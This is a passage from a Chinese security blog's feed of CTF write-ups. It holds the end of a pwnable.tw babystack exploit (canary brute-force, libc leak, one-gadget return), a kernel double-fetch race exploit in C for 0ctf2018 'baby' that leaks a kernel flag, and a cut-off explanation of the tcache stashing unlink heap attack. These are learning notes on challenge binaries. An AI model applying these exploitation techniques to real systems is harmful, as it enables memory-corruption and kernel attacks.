class="number">0x18</span>) + (j &lt;&lt; <span class="number">0x10</span>) + (i &lt;&lt; <span class="number">0x8</span>) + <span class="number">0xb4</span> </span><br><span class="line">    success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">    <span class="keyword">return</span> libc_info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random</span>():</span><br><span class="line">    random_pre = <span class="string">b&quot;&quot;</span></span><br><span class="line">    result_case = []</span><br><span class="line">    break_flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">            <span class="comment"># if there exist one zero,not right,bad luck</span></span><br><span class="line">            random_test = random_pre + p8(j) + p8(<span class="number">0x0</span>) <span class="comment"># from the test case</span></span><br><span class="line">            result = get_passwd(random_test)</span><br><span class="line">            <span class="keyword">if</span>(result ==<span class="literal">True</span>):</span><br><span class="line">                success(<span class="string">&#x27;result for byte &#x27;</span> + <span class="built_in">repr</span>(i) + <span class="string">&#x27; is &#x27;</span> + <span class="built_in">repr</span>(<span class="built_in">hex</span>(j)))</span><br><span class="line">                random_pre+=p8(j)</span><br><span class="line">                result_case.append(j)</span><br><span class="line">                io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">                io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># log out</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">0xff</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;bad luck&quot;</span>) <span class="comment"># contains \x00 byte, must overlap and exploit the rest bytes</span></span><br><span class="line">    <span class="keyword">return</span> result_case           </span><br><span class="line">    </span><br><span class="line">random_case = get_random()</span><br><span class="line"><span class="comment"># print(random_case)</span></span><br><span class="line">random1 = (random_case[<span class="number">7</span>]&lt;&lt;<span class="number">0x38</span>) + (random_case[<span class="number">6</span>]&lt;&lt;<span class="number">0x30</span>) + (random_case[<span class="number">5</span>]&lt;&lt;<span class="number">0x28</span>) + (random_case[<span class="number">4</span>]&lt;&lt;<span class="number">0x20</span>) + (random_case[<span class="number">3</span>]&lt;&lt;<span class="number">0x18</span>) + (random_case[<span class="number">2</span>]&lt;&lt;<span class="number">0x10</span>) + (random_case[<span class="number">1</span>]&lt;&lt;<span class="number">0x8</span>) + (random_case[<span class="number">0</span>])</span><br><span class="line">random2 = (random_case[<span class="number">15</span>]&lt;&lt;<span class="number">0x38</span>) + (random_case[<span class="number">14</span>]&lt;&lt;<span class="number">0x30</span>) + (random_case[<span class="number">13</span>]&lt;&lt;<span class="number">0x28</span>) + (random_case[<span class="number">12</span>]&lt;&lt;<span class="number">0x20</span>) + (random_case[<span class="number">11</span>]&lt;&lt;<span class="number">0x18</span>) + (random_case[<span class="number">10</span>]&lt;&lt;<span class="number">0x10</span>) + (random_case[<span class="number">9</span>]&lt;&lt;<span class="number">0x8</span>) + (random_case[<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;random1: &quot;</span> + <span class="built_in">hex</span>(random1))</span><br><span class="line">success(<span class="string">&quot;random2: &quot;</span> + <span class="built_in">hex</span>(random2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># write stack , then following copying do the copy</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0xE43&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">get_passwd(password2) <span class="comment"># least bit will be zero, ending copying</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">copy(payload1) <span class="comment"># copy, overlap password and cause overflow</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0xE43&quot;) # break at strncmp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># log out</span></span><br><span class="line">libc_info = get_libc()</span><br><span class="line">libc_base = libc_info - <span class="number">0x06ffb4</span></span><br><span class="line">success(<span class="string">&quot;libc_base:&quot;</span>  + <span class="built_in">hex</span>(libc_base)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># final OG to ret to hijack, since we don&#x27;t leak pie base</span></span><br><span class="line">og = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xef6c4</span>,<span class="number">0xf0567</span>]</span><br><span class="line"></span><br><span class="line">password3 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">63</span> + p64(random1) + p64(random2) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(libc_base + og[<span class="number">0</span>])*<span class="number">2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># log out</span></span><br><span class="line">get_passwd(password3) <span class="comment"># pass</span></span><br><span class="line">payload2 = <span class="string">b&#x27;aaaaaaaa&#x27;</span></span><br><span class="line">copy(payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0xFF1&quot;) # break at memcmp</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x1051&quot;) # break at leave return</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>) <span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/02/14/pwnable-babystack/image-20220214194526112.png" alt="image-20220214194526112"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>关于栈未初始化漏洞，我觉得其实可以深入挖掘一下，因为这十分细节，而且一般防御方法很难做到对栈保护（除非每次调用玩清零，但是这涉及到虚拟内存不同位置的多次IO，可能需要很大的开销）</p><p>其实编写利用栈残留数据的题目挺难的。在pwnable上面见到了两道，一般的比赛中很少见到。</p><p>(另外pwnable.tw服务器越来越慢了:(之前做的两题加上这个都没法交，尤其是这个爆破的，估计按照服务器的速度，要至少两三个小时，早就触发alarm了)不过不得不说,pwnable.tw还是值得刷的！</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-4-doubleFetch</title>
      <link href="/2022/02/11/kernel-4-doubleFetch/"/>
      <url>/2022/02/11/kernel-4-doubleFetch/</url>
      
        <content type="html"><![CDATA[<p>内核学习(四) double_fetch。这次主要基于<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/">ctf_wiki</a>学习。DoubleFetch相关知识点可在<a href="https://msrc-blog.microsoft.com/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/">微软安全研究</a>中找到。</p><span id="more"></span><h1 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double_fetch"></a>double_fetch</h1><p>阅读<a href="https://msrc-blog.microsoft.com/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/">微软安全研究</a>的文章</p><p><strong>double_fetch是指当内核根据用户输入先判断某个参数的信息，保存在本地之后，如果后面还需要访问这个内容(当内核函数两次从同一用户内存地址读取同一数据时，通常第一次读取用来验证数据或建立联系，第二次则用来使用该数据)，可能会复制进来新的信息(利用多线程，条件竞争)这样可能会导致信息不匹配。严重的话可能导致堆栈溢出等情况</strong>。</p><p>一个很简单的例子是如下代码，也是上述文章中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Attacker controls lParam</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win32k_entry_point</span><span class="params">(…)</span> &#123;</span><br><span class="line">   […]</span><br><span class="line">      <span class="comment">// lParam has already passed successfully the ProbeForRead</span></span><br><span class="line">      my_struct = (PMY_STRUCT)lParam;</span><br><span class="line">      <span class="keyword">if</span> (my_struct -&gt;lpData) &#123;</span><br><span class="line">           cbCapture = <span class="keyword">sizeof</span>(MY_STRUCT) + my_struct-&gt;cbData;  <span class="comment">// [1] first fetch</span></span><br><span class="line">    […]</span><br><span class="line">                 <span class="comment">// my_struct -&gt;lpData has already passed successfully the ProbeForRead</span></span><br><span class="line">    […]</span><br><span class="line">            <span class="keyword">if</span> ( my_allocation = UserAllocPoolWithQuota(cbCapture, TAG_SMS_CAPTURE)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                 RtlCopyMemory(my_allocation, my_struct-&gt;lpData, my_struct-&gt;cbData);   <span class="comment">// [2] second fetch</span></span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   […]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果第一次通过fetch拿到了一个长度，第二次如果是别的内核线程运行到这里，由于没有加锁，可能从相同的结构体中复制错误的数据长度。简单来说，其实就是多线程下共享变量未保护的问题(个人理解)</p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>这里使用经典的0ctf2018 finals baby。这里的double_fetch的效果是读取内核特定地址信息，没有完成提权等效果。</p><p>首先解压文件系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解包文件系统</span></span><br><span class="line">mkdir core</span><br><span class="line">mv core.cpio ./core/core.cpio</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br><span class="line">rm -rf core.cpio</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到baby.ko文件，放到IDA中，打包文件系统</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重打包文件系统</span></span><br><span class="line">find . | cpio -o --format=newc &gt; core.cpio</span><br><span class="line">mv ./core.cpio ../</span><br></pre></td></tr></table></figure><p>放在IDA里面看一下。驱动主要用两个功能</p><ol><li>当command=0x6666时，输出flag对应的地址</li><li>当command=0x1337时，对我们的输入做如下比较之后，逐字节比较我们输入的flag和正确的flag。如果一样就给出flag（和没有一样）</li></ol><p><img src="/2022/02/11/kernel-4-doubleFetch/image-20220211115806806.png" alt="image-20220211115806806"></p><p>因此可以看出，比较的内容如下</p><p><img src="/2022/02/11/kernel-4-doubleFetch/image-20220211115923349.png" alt="image-20220211115923349"></p><p>这里注意到flag是硬编码的。远程的flag是修改过的，所以长度肯定也不同。因此我们还需要知道远程flag的长度。这个可以一个一个尝试来获取。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>之前的double_fetch框架提示我们：需要两次对用户输入判断才能利用这种工具。这里恰好有这种情形。可以看出，<strong>如果第一个线程的输入成功绕过位于用户空间的比对条件之后，在和flag逐字节比较之前，将我们的flag指针改为之前打印出来的内核地址</strong>，就可以在后面比较时泄露内核地址。</p><p>我们exp编写的步骤为</p><blockquote><ol><li>拿到flag内核地址，flag长度。</li><li>通过多线程double_fetch实现buf指针的劫持，绕过检测</li><li>通过dmesg查找到内核打印到内核缓冲区的flag</li></ol></blockquote><p>dmesg命令用于显示开机信息，属于内核信息。用户态需要通过<strong>dmesg命令</strong>来看到。</p><h1 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h1><h2 id="获得flag长度"><a href="#获得flag长度" class="headerlink" title="获得flag长度"></a>获得flag长度</h2><p>从反汇编代码看出，如果检查条件(所属空间、长度)不满足，返回值为0x16。我们只需要在用户态编写循环遍历即可得到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>        <span class="comment">/* System V */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>    <span class="comment">/* BSD and Linux */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_input</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag_str;</span><br><span class="line">    <span class="type">long</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_input</span> *<span class="title">input</span> =</span> (<span class="keyword">struct</span> user_input*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_input));</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(cnt=<span class="number">0</span>;cnt&lt;<span class="number">50</span>;cnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;trying %d: &quot;</span>,cnt);</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        input-&gt;flag_str = <span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">        input-&gt;length = cnt;</span><br><span class="line">        ret = ioctl(fd,<span class="number">0x1337</span>,input);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">0x16</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ok! the length of flag is %d\n&quot;</span>,cnt);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;return %d\n&quot;</span>,ret);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到远程的flag长度为33。</p><p><img src="/2022/02/11/kernel-4-doubleFetch/image-20220211150611494.png" alt="image-20220211150611494"></p><h2 id="double-fetch-1"><a href="#double-fetch-1" class="headerlink" title="double_fetch"></a>double_fetch</h2><p>这里需要创建两个线程（一个为原先的主线程）其中主线程不断发起<code>ioctl(fd,0x1337,&amp;input)</code>另一个线程反复修改传递的input结构体中的flag_addr数值。由于每次需要通过dmesg查看输出的flag地址比较麻烦，ctf-wiki上面采用了读取文件，利用字符串匹配寻找到最终目标地址的方法。</p><p>需要注意的是子线程每次修改的，必须是和主线程一样的数据结构中的flag_buf。最好定义成全局的(虽然理论上来说，不同线程的栈也可以共享)，<strong>此外，尽量让线程少输出，因为io会大大增加开销，可能导致竞争失败</strong>，原先这里就卡了好久，结果关掉输出就对了。</p><p>下面的exp主要参考ctf-wiki上面。自己敲了一遍代码，理解了一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static exp.c -lpthread -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *haystack, <span class="type">const</span> <span class="type">char</span> *needle)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcasestr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *haystack, <span class="type">const</span> <span class="type">char</span> *needle)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRYTIME 0x1000 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_input</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag_str;</span><br><span class="line">    <span class="type">long</span> length;</span><br><span class="line">&#125; input;</span><br><span class="line"><span class="type">int</span> finish = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> flag_place;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trying</span><span class="params">(<span class="type">void</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_input</span> *<span class="title">mal</span> =</span> s;</span><br><span class="line">    <span class="keyword">while</span>(finish == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;trying..%u\n&quot;,flag_place); //no io!!!</span></span><br><span class="line">        mal-&gt;flag_str = flag_place; <span class="comment">// maliciously changeing</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> tmp_fd = open(<span class="string">&quot;/tmp/record.txt&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">0x1000</span>];</span><br><span class="line">    lseek(tmp_fd,<span class="number">-0x100</span>,SEEK_END);</span><br><span class="line">    read(tmp_fd,temp,<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">char</span> * idx = <span class="built_in">strstr</span>(temp,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Not found addr&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">close(tmp_fd);</span><br><span class="line">    idx+=<span class="number">16</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr = strtoull(idx,idx+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;------addr----------&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]flag addr: %p\n&quot;</span>,addr);</span><br><span class="line">    flag_place = addr;</span><br><span class="line">    input.flag_str = buf;</span><br><span class="line">    input.length = <span class="number">33</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> cnt1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> cnt2 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//thread</span></span><br><span class="line">    <span class="type">pthread_t</span> t1;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,trying,&amp;input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// main thread</span></span><br><span class="line">    <span class="keyword">for</span>(cnt1=<span class="number">0</span>;cnt1&lt;<span class="number">1000</span>;cnt1++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd,<span class="number">0x1337</span>,&amp;input);</span><br><span class="line">        input.flag_str = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] result is: &quot;</span>);</span><br><span class="line">system(<span class="string">&quot;dmesg | grep THIS&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/qq_43116977/article/details/105868792">https://blog.csdn.net/qq_43116977/article/details/105868792</a></p><p><a href="http://p4nda.top/2018/07/20/0ctf-baby/">http://p4nda.top/2018/07/20/0ctf-baby/</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache-stashing-unlink-attack</title>
      <link href="/2022/02/07/tcache-stashing-unlink-attack/"/>
      <url>/2022/02/07/tcache-stashing-unlink-attack/</url>
      
        <content type="html"><![CDATA[<p>tcache stashing unlink attack最先一次见到是在buuoj上的新春红包题上。<a href="https://blog.csdn.net/weixin_46521144/article/details/119536209">链接</a><br>这次再次学习，是为了后面的House-of-pig做准备</p><span id="more"></span><h1 id="原理-amp-源码"><a href="#原理-amp-源码" class="headerlink" title="原理&amp;源码"></a>原理&amp;源码</h1><h2 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h2><p>glibc2.29及以前</p><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><h3 id="回顾-house-of-lore"><a href="#回顾-house-of-lore" class="headerlink" title="回顾-house of lore"></a>回顾-house of lore</h3><p>在分配smallbin时，会便利smallbin链表直到末尾。<strong>如果能够控制末尾指针，就能任意分配一个块</strong></p><p>但是需要绕过如下检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">set_inuse_bit_at_offset (victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>其中最关键的是验证<code>bck-&gt;fd != victim</code>。即smallbin中正常的块的fd位置是不是指向我们伪造的块，并且我们伪造的块的bk地址要指向smallbin中之前的堆块(也可以伪造，类似unlink一样的方法即可)</p><h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h3><p>简单来说，就是<strong>当smallbin中存在块，但是tcache未满时</strong>，如果从smallbin在取出一个块后未空，那么就会把这个对应大小的smallbin中的所有chunk全部转移到相应大小的tcache中，直到tcache满为止。这个看似矛盾的情况，在calloc的使用中存在可能性。因为calloc永远都不从tcache里面取块，可以越过tcache取smallbin中的块，从而触发攻击。</p><p>举个例子。如果出现以下情景。有两个smallbin的块，<strong>六个tcache对应的块</strong></p><p><img src="/2022/02/07/tcache-stashing-unlink-attack/image-20220207124623191.png" alt="image-20220207124623191"></p><p>在使用calloc从smallbin取出一块之后之后，堆结构如下所示</p><p><img src="/2022/02/07/tcache-stashing-unlink-attack/2.png" alt="2"></p><p>注意，<strong>当原先tcache有六个块时</strong>，只会把A放入tcache中，<strong>无法完成一个任意地址分配块的操作</strong>。但是此时会把A的BK位置写上一个main_arena。（因为此时glibc误以为，A的bk位置还是一个块，需要把这个快标记上循环链表指针）</p><p>但是当原先tcache有五个块，就可以实现分配一个任意地址到堆。</p><p>原理应该很好理解。<strong>就是一个不断在tcache中追溯bk的过程</strong>。由于tcache没有任何bk的检查，<strong>因此会直接分配一个tcache结构体</strong>。回顾之前讲的house of lore，两者的区别是一个关注了smallbin，另一个关注的是tcache。用一个简单的图表示如下。</p><p>第一步还是和之前一样</p><p><img src="/2022/02/07/tcache-stashing-unlink-attack/image-20220207125352106.png" alt="image-20220207125352106"></p><p>但是此时在取出过后，<strong>由于tcache未满7个，会继续向上追溯</strong>，此时需要注意被伪造的堆块位置需要有可写条件。这里我就用下面相关实践题目的情形来写了。</p><p><img src="/2022/02/07/tcache-stashing-unlink-attack/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件"></p><p><img 